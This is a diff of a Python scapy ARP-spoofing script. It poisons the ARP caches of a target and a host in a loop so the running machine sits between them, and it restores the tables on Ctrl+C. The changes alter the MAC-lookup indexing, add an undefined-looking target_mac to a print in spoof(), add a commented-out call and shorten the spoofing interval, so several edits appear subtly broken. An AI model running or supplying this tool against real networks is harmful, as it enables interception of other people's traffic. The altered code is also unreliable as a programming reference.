@@ -55,7 +55,7 @@ def get_mac(ip):
     """
     ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
     if ans:
-        return ans[0][1].src
+        return ans[0][0][1].src
 
 
 def spoof(target_ip, host_ip, verbose=True):
@@ -72,10 +72,10 @@ def spoof(target_ip, host_ip, verbose=True):
     # send the packet
     # verbose = 0 means that we send the packet without printing any thing
     send(arp_response, verbose=0)
-    if verbose:
+    if verbose: 
         # get the MAC address of the default interface we are using
         self_mac = ARP().hwsrc
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
+        print("[+] Sent to {} : {} is-at {} {}".format(target_ip, host_ip, self_mac, target_mac))
 
 
 def restore(target_ip, host_ip, verbose=True):
@@ -110,11 +110,13 @@ if __name__ == "__main__":
     try:
         while True:
             # telling the `target` that we are the `host`
+            # spoof(target_ip, host_ip, verbose=True):
             spoof(target, host, verbose)
+            time.sleep(5)
             # telling the `host` that we are the `target`
             spoof(host, target, verbose)
             # sleep for one second
-            time.sleep(10)
+            time.sleep(5)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
         restore(target, host)
